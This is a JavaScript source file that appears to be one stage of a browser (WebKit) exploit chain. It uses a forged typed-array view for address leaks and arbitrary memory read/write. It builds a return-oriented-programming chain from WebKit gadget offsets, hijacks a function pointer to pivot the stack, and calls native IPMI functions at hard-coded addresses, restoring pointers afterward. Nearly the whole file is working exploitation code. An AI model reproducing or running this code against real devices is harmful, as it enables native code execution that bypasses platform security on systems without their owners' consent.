// Create two owned IPMI clients at once, query each name from the same
// process, then destroy both. All temporary browser pointers are restored.
var result;
var phase="preflight";
try {
  var state=window.__fw14ArrayState;
  var plan=window.__fw14NativePlan;
  var native=window.__fw14NativeInvoke;
  if (!state || !plan || !state.view || !state.array || !state.a ||
      !state.ownedTypedView || !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0]!==state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !plan.functionSlot || !plan.pivotCell || !plan.pivotObject ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase))
    throw new Error("held_plan_missing");
  var forged=state.view;
  var carrier=state.ownedTypedView;
  var base=state.calibratedViewBase;
  if (carrier.length!==65536 || carrier[0]!==0x31 ||
      carrier[7]!==0xa8 || base%4096!==0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index,count) {
    var out=[];
    for (var n=0;n<count;n++) out.push(forged[index+n]);
    return out;
  }
  function valueOf(bytes) {
    var value=0;
    for (var n=bytes.length-1;n>=0;n--)
      value=value*256+bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value<0 ||
        value>=0x1000000000000)
      throw new Error("pointer_invalid");
    var out=[];
    for (var n=0;n<8;n++)
      out.push(Math.floor(value/Math.pow(2,n*8))&255);
    return out;
  }
  function same(left,right) {
    if (!left || !right || left.length!==right.length) return false;
    for (var n=0;n<left.length;n++)
      if (left[n]!==right[n]) return false;
    return true;
  }
  function addressOf(object) {
    try {
      state.array[0]=object;
      return valueOf(bytesAt(state.index,8));
    } finally {
      state.array[0]=state.a;
    }
  }
  var carrierIndex=addressOf(carrier)-base;
  var carrierSlot=carrierIndex+8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot<0 ||
      carrierSlot+8>=16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal=bytesAt(carrierSlot,8);
  function readAt(address,count) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || count<1 || count>192)
      throw new Error("native_read_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      var out=[];
      for (var r=0;r<count;r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  function writeAt(address,bytes) {
    if (!Number.isSafeInteger(address) || address<0x100000000 ||
        address>=0x1000000000000 || address%8!==0 ||
        !bytes || bytes.length!==8)
      throw new Error("native_write_invalid");
    var next=pointerBytes(address);
    try {
      for (var n=0;n<8;n++) forged[carrierSlot+n]=next[n];
      for (var w=0;w<8;w++) carrier[w]=bytes[w];
    } finally {
      for (var x=0;x<8;x++)
        forged[carrierSlot+x]=carrierOriginal[x];
    }
  }
  var ipmi=0x833f00000;
  var targets={
    ipmi_config_init:[ipmi+0x11b0,
      [0xc5,0xf8,0x10,0x05,0x88,0x63,0x00,0x00,
       0x48,0xb8,0x00,0x00,0x00,0x00,0x01,0x00]],
    ipmi_client_create:[ipmi+0x1300,
      [0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56,
       0x41,0x55,0x41,0x54,0x53,0x50,0x48,0x85]],
    ipmi_client_destroy:[ipmi+0x630,
      [0x55,0x48,0x89,0xe5,0x41,0x56,0x53,0x48,
       0x89,0xfb,0x8b,0x7f,0x08,0xe8,0x0e,0x3a]],
    ipmi_client_name:[ipmi+0x54f0,
      [0x55,0x48,0x89,0xe5,0x53,0x48,0x83,0xec,
       0x18,0x48,0x8b,0x1d,0xc0,0x6e,0x00,0x00]],
    ipmi_server_name:[ipmi+0x5470,
      [0x55,0x48,0x89,0xe5,0x53,0x48,0x83,0xec,
       0x18,0x48,0x8b,0x1d,0x40,0x6f,0x00,0x00]]
  };
  if (!same(readAt(ipmi,8),[0x55,0x48,0x89,0xe5,0x41,0x57,0x41,0x56]))
    throw new Error("ipmi_image_prefix_changed");
  for (var tname in targets)
    if (!same(readAt(targets[tname][0],16),targets[tname][1]))
      throw new Error("ipmi_signature_changed_"+tname);
  if (!same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
      !same(readAt(plan.addresses.store,8),
            Array.from(plan.store.subarray(0,8))) ||
      !same(readAt(plan.addresses.stack+plan.stackOffset,8),
            pointerBytes(plan.target)) ||
      Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
    throw new Error("native_plan_changed");
  var scratchOffset=0x2f80;
  var chainSize=19*8;
  if (scratchOffset<plan.stackOffset+64 ||
      scratchOffset+chainSize>=plan.stack.length ||
      plan.frame.length<0x2000)
    throw new Error("scratch_region_invalid");
  var caller=function (name,args) {
    if (!Object.prototype.hasOwnProperty.call(targets,name))
      throw new Error("target_not_allowed");
    if (!Array.isArray(args) || args.length>6)
      throw new Error("args_invalid");
    var values=[];
    for (var ai=0;ai<6;ai++) {
      var value=ai<args.length?args[ai]:0;
      if (!Number.isSafeInteger(value) || value<0 ||
          value>=0x1000000000000)
        throw new Error("arg_invalid_"+ai);
      values.push(value);
    }
    var target=targets[name][0];
    if (!same(readAt(target,16),targets[name][1]) ||
        !same(readAt(plan.functionSlot,8),plan.originalFunctionSlot) ||
        !same(readAt(plan.addresses.store,8),
              Array.from(plan.store.subarray(0,8))) ||
        !same(readAt(plan.addresses.stack+plan.stackOffset,8),
              pointerBytes(plan.target)) ||
        Math.abs(Math.expm1(1)-1.718281828459045)>1e-12)
      throw new Error("call_preflight_changed");
    var functionOriginal=readAt(plan.functionSlot,8);
    var pivotOriginal=readAt(plan.pivotCell,8);
    var pivotStackOriginal=readAt(plan.addresses.pivot+0x38,8);
    var frameOriginal=Array.from(plan.frame.subarray(0,8));
    var chainOriginal=Array.from(plan.stack.subarray(
      scratchOffset,scratchOffset+chainSize));
    if (!same(pivotOriginal.slice(0,7),plan.pivotHeader.slice(0,7)) ||
        pivotOriginal[7]>2 ||
        !same(pivotStackOriginal,
              pointerBytes(plan.addresses.stack+plan.stackOffset)))
      throw new Error("pivot_preflight_changed");
    var functionTouched=false,pivotTouched=false,stackTouched=false;
    var chainTouched=false,frameTouched=false;
    var output=null;
    try {
      frameTouched=true;
      plan.frame.fill(0xa5,0,8);
      if (!same(readAt(plan.addresses.frame,8),
                [0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5,0xa5]))
        throw new Error("result_sentinel_changed");
      var chain=[plan.webkitBase+0x5c480,values[0],
        plan.webkitBase+0x6e45e,values[1],
        plan.webkitBase+0x12c5ba,values[2],
        plan.webkitBase+0x1bade,values[3],
        plan.webkitBase+0x9b311,values[4],
        plan.webkitBase+0x1dcfb1,values[5],
        target,plan.webkitBase+0x5c480,plan.addresses.frame,
        plan.webkitBase+0x548b,plan.webkitBase+0x10504,null,
        plan.webkitBase+0x182f7];
      var stackView=new DataView(plan.stack.buffer);
      chainTouched=true;
      for (var c=0;c<chain.length;c++) {
        if (c===17) {
          stackView.setUint32(scratchOffset+c*8,0x0a,true);
          stackView.setUint32(scratchOffset+c*8+4,0xfffffff7,true);
        } else {
          stackView.setUint32(scratchOffset+c*8,chain[c]>>>0,true);
          stackView.setUint32(scratchOffset+c*8+4,
            Math.floor(chain[c]/0x100000000)>>>0,true);
        }
      }
      stackTouched=true;
      var nextStack=pointerBytes(plan.addresses.stack+scratchOffset);
      for (var s=0;s<8;s++) plan.pivot[0x38+s]=nextStack[s];
      if (!same(readAt(plan.addresses.stack+scratchOffset,chainSize),
                Array.from(plan.stack.subarray(scratchOffset,
                                              scratchOffset+chainSize))) ||
          !same(readAt(plan.addresses.pivot+0x38,8),nextStack))
        throw new Error("chain_readback_failed");
      functionTouched=true;
      writeAt(plan.functionSlot,pointerBytes(plan.webkitBase+0x295f948));
      pivotTouched=true;
      writeAt(plan.pivotCell,pointerBytes(plan.addresses.store));
      if (!same(readAt(plan.functionSlot,8),
                pointerBytes(plan.webkitBase+0x295f948)) ||
          !same(readAt(plan.pivotCell,8),
                pointerBytes(plan.addresses.store)))
        throw new Error("call_arm_failed");
      Math.expm1(plan.pivotObject);
      var frameView=new DataView(plan.frame.buffer);
      output={ value:frameView.getInt32(0,true),
               high:frameView.getUint32(4,true) };
    } finally {
      if (functionTouched) writeAt(plan.functionSlot,functionOriginal);
      if (pivotTouched) writeAt(plan.pivotCell,pivotOriginal);
      if (stackTouched)
        for (var ps=0;ps<8;ps++)
          plan.pivot[0x38+ps]=pivotStackOriginal[ps];
      if (chainTouched)
        for (var cs=0;cs<chainSize;cs++)
          plan.stack[scratchOffset+cs]=chainOriginal[cs];
      if (frameTouched)
        for (var fs=0;fs<8;fs++) plan.frame[fs]=frameOriginal[fs];
    }
    if (!same(readAt(plan.functionSlot,8),functionOriginal) ||
        !same(readAt(plan.pivotCell,8),pivotOriginal) ||
        !same(readAt(plan.addresses.pivot+0x38,8),pivotStackOriginal) ||
        !same(readAt(plan.addresses.stack+scratchOffset,chainSize),
              chainOriginal) ||
        !same(readAt(plan.addresses.frame,8),frameOriginal) ||
        !same(bytesAt(carrierSlot,8),carrierOriginal) ||
        carrier[0]!==0x31 || carrier[7]!==0xa8 ||
        state.array[0]!==state.a)
      throw new Error("call_restore_failed");
    return output;
  };
  var configOffset=0x600, outOffset=0x500, storageOffset=0x1000;
  var nameOffset=0x800, nameEnd=0x900, copyOffset=0x900;
  var configAddress=plan.addresses.frame+configOffset;
  var outAddress=plan.addresses.frame+outOffset;
  var storageAddress=plan.addresses.frame+storageOffset;
  var nameAddress=plan.addresses.frame+nameOffset;
  var copyAddress=plan.addresses.frame+copyOffset;
  var scratchOriginal=Array.from(plan.frame.subarray(
    outOffset,storageOffset+0x1000));
  var before=native.call("getpid",[]);
  if (before.value!==145 || before.high!==0)
    throw new Error("session_pid_changed");
  function readName() {
    var text="";
    for (var i=0;i<0x80;i++) {
      var value=plan.frame[nameOffset+i];
      if (value===0) break;
      text+=value>=32 && value<127?String.fromCharCode(value):"?";
    }
    return text.slice(0,40);
  }
  function writeName(text) {
    plan.frame.fill(0,configOffset,configOffset+0x20);
    for (var i=0;i<text.length;i++)
      plan.frame[configOffset+i]=text.charCodeAt(i);
    plan.frame[configOffset+text.length]=0;
  }
  function readKid() {
    var frameView=new DataView(plan.frame.buffer);
    return frameView.getUint32(storageOffset+8,true);
  }
  var createA=null,createB=null,destroyA=null,destroyB=null;
  var kidA=0,kidB=0,nameA="",nameAAfterB="",nameB="",serverNegative=null;
  try {
    phase="two_client";
    if (api && typeof api.markSync==="function")
      api.markSync("ipmi_two_preflight");
    plan.frame.fill(0,outOffset,storageOffset+0x1000);
    caller("ipmi_config_init",[configAddress]);
    writeName("Fw14ProbeA");
    createA=caller("ipmi_client_create",
      [outAddress,configAddress,0,storageAddress]);
    if (createA.value===0) {
      kidA=readKid();
      plan.frame.fill(0,nameOffset,nameEnd);
      var controlA=caller("ipmi_client_name",[kidA,nameAddress]);
      nameA=controlA.value===0?readName():"";
      for (var ci=0;ci<0x100;ci++)
        plan.frame[copyOffset+ci]=plan.frame[storageOffset+ci];
      if (api && typeof api.markSync==="function")
        api.markSync("ipmi_two_first");
      plan.frame.fill(0,storageOffset,storageOffset+0x1000);
      writeName("Fw14ProbeB");
      createB=caller("ipmi_client_create",
        [outAddress,configAddress,0,storageAddress]);
      if (createB.value===0) {
        kidB=readKid();
        plan.frame.fill(0,nameOffset,nameEnd);
        var crossA=caller("ipmi_client_name",[kidA,nameAddress]);
        nameAAfterB=crossA.value===0?readName():"";
        plan.frame.fill(0,nameOffset,nameEnd);
        var controlB=caller("ipmi_client_name",[kidB,nameAddress]);
        nameB=controlB.value===0?readName():"";
        plan.frame.fill(0,nameOffset,nameEnd);
        serverNegative=caller("ipmi_server_name",[kidA,nameAddress]);
        if (api && typeof api.markSync==="function")
          api.markSync("ipmi_two_second");
        destroyA=caller("ipmi_client_destroy",[copyAddress]);
        destroyB=caller("ipmi_client_destroy",[storageAddress]);
      } else {
        destroyA=caller("ipmi_client_destroy",[copyAddress]);
      }
    }
  } finally {
    for (var fi=0;fi<scratchOriginal.length;fi++)
      plan.frame[outOffset+fi]=scratchOriginal[fi];
  }
  var after=native.call("getpid",[]);
  var scratchRestored=scratchOriginal.every(function (byte,index) {
    return plan.frame[outOffset+index]===byte;
  });
  var callerRestored=same(bytesAt(carrierSlot,8),carrierOriginal) &&
    carrier[0]===0x31 && carrier[7]===0xa8 &&
    state.array[0]===state.a &&
    Math.abs(Math.expm1(1)-1.718281828459045)<=1e-12;
  if (api && typeof api.markSync==="function")
    api.markSync("ipmi_two_restored");
  result={id:"ipmi_two_client_v1",
    status:(createA!==null && after.value===before.value &&
      after.high===0 && scratchRestored && callerRestored)?"pass":"fail",
    details:{create_a_return:createA?createA.value:null,
      kid_a:kidA,
      name_a:nameA,
      create_b_return:createB?createB.value:null,
      kid_b:kidB,
      name_b:nameB,
      name_a_after_b:nameAAfterB,
      server_negative_return:serverNegative?serverNegative.value:null,
      destroy_pair:(destroyA?destroyA.value:null)+"/"+
        (destroyB?destroyB.value:null),
      pid_ok:after.value===before.value&&after.high===0,
      caller_restored:callerRestored,
      scratch_restored:scratchRestored}};
} catch (error) {
  result={id:"ipmi_two_client_v1",status:"error",
    details:{phase:phase,error:String(error).slice(0,180)}};
}
return [result];
